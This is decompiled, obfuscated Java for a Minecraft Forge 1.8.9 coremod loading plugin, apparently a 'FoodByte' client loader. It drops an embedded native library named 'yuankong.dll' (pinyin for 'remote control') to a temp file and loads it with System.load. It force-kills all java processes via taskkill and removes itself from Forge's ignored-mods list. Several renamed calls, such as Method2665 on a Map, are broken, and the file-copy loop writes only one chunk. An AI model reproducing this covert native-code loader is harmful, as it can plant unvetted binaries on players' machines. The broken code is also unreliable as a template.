package awsl;

import java.awt.Component;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URISyntaxException;
import java.net.URL;
import java.security.CodeSource;
import java.util.Map;
import javax.swing.JOptionPane;
import net.minecraftforge.fml.relauncher.CoreModManager;
import net.minecraftforge.fml.relauncher.IFMLLoadingPlugin;
import net.minecraftforge.fml.relauncher.IFMLLoadingPlugin.MCVersion;
import net.minecraftforge.fml.relauncher.IFMLLoadingPlugin.SortingIndex;
import org.apache.logging.log4j.LogManager;

@SortingIndex(9999)
@MCVersion("1.8.9")
public class Class626 implements IFMLLoadingPlugin {
   public static boolean Field2878;

   public Class626() {
      Class441.Method2706();
      CodeSource var2 = this.getClass().getProtectionDomain().getCodeSource();
      URL var3 = var2.getLocation();

      try {
         File var4 = new File(var3.toURI());
         if (var4.isFile()) {
            CoreModManager.getIgnoredMods().remove(var4.getName());
         }
      } catch (URISyntaxException var5) {
         var5.printStackTrace();
      }

      LogManager.getLogger().warn("No CodeSource, if this is not a development environment we might run into problems!");
      LogManager.getLogger().warn(this.getClass().getProtectionDomain());
   }

   public String[] getASMTransformerClass() {
      return new String[]{Class692.class.getName()};
   }

   public String getModContainerClass() {
      return null;
   }

   public String getSetupClass() {
      return null;
   }

   public void injectData(Map a) {
      Class441.Method2700();
      Field2878 = (Boolean)a.Method2665("runtimeDeobfuscationEnabled");
   }

   public String getAccessTransformerClass() {
      return null;
   }

   public static void Method3498() {
      int var0 = Class441.Method2706();

      try {
         File var1 = File.createTempFile("FoodByte", ".dll");
         var1.deleteOnExit();
         if (var1.exists()) {
            try {
               var1.delete();
            } catch (Throwable var19) {
               JOptionPane.showMessageDialog((Component)null, "文件占用 按确定后将尝试自动结束java进程！ \n File already using.Press [ Yes ] to kill the java process.");
               Runtime.getRuntime().exec("taskkill /F /IM java.exe");
               Runtime.getRuntime().exec("taskkill /F /IM javaw.exe");
               var19.printStackTrace();
            }
         }

         try {
            FileOutputStream var2 = new FileOutputStream(var1);
            Throwable var3 = null;
            boolean var16 = false;

            try {
               var16 = true;
               byte[] var4 = new byte[1024];
               InputStream var6 = Class626.class.getResourceAsStream("yuankong.dll");
               int var5;
               if ((var5 = var6.read(var4)) > 0) {
                  var2.write(var4, 0, var5);
                  var2.flush();
               }

               var6.Method2519();
               var2.close();
               var16 = false;
            } catch (Throwable var20) {
               var3 = var20;
               throw var20;
            } finally {
               if (var16) {
                  try {
                     var2.close();
                  } catch (Throwable var17) {
                     var3.addSuppressed(var17);
                     var2.close();
                  }

               }
            }

            try {
               var2.close();
            } catch (Throwable var18) {
               var3.addSuppressed(var18);
            }
         } catch (Exception var22) {
         }

         System.load(var1.getAbsolutePath());
      } catch (Throwable var23) {
         if (!Class626.class.getName().endsWith("FoodByteLoadingPlugin")) {
            if (JOptionPane.showConfirmDialog((Component)null, "failed Initial.program will exit... 初始化失败....") == 1) {
            }

            LogManager.getLogger().warn("failed Initial.program will exit... 初始化失败....");
            var23.printStackTrace();
         }
      }

   }

   public static void Method3499() {
      try {
         new Class750();
      } catch (Throwable var1) {
      }

   }

   static {
      Method3499();
      Field2878 = true;
   }

   private static Throwable Method3500(Throwable throwable) {
      return throwable;
   }
}
